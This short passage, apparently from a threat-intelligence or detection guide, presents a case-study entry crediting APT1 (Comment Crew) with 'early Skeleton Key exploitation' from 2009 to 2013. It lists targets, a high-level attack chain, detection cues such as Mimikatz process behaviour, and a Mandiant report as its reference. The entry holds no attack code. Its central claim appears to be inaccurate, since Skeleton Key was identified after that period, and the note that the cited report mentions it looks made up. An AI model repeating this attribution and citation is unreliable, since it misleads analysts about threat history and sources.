#### Example 3: APT1 (Comment Crew) - Early Skeleton Key Exploitation (2009-2013)

- **Target:** Multiple U.S. government agencies, contractors
- **Technique Usage:** Compromised internal networks through phishing, escalated to Domain Admin, injected Skeleton Key for persistent access
- **Impact:** Long-term access to classified defense contractor systems
- **Detection:** Unusual authentication patterns from foreign IP ranges; EDR detection of Mimikatz process behavior
- **Reference:** [Mandiant Exposure: APT1](https://www.mandiant.com/resources/apt1-exposing-one-of-chinas-cyber-espionage-units) (Case study mentions Skeleton Key as post-exploitation technique)

---